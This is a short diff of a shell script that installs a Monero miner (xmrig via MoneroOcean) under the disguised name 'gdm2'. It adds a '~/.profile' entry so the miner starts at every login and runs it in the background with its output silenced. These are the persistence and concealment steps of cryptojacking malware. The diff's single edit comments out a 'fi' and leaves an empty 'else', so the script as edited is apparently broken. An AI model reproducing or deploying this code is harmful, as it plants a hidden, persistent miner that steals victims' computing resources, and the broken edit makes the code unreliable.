@@ -224,7 +224,7 @@ if ! sudo -n true 2>/dev/null; then
   echo "[*] Adding script to profile"
    echo "$HOME/.gdm2/gdm2.rc --config=$HOME/.gdm2/config_background.json >/dev/null 2>&1" >>$HOME/.profile
   else
-  fi
+#  fi
    echo "[*] Running miner in the background (see logs in $HOME/moneroocean/xmrig.log file)"
   /bin/bash $HOME/.gdm2/gdm2.rc --config=$HOME/.gdm2/config_background.json >/dev/null 2>&1
 else
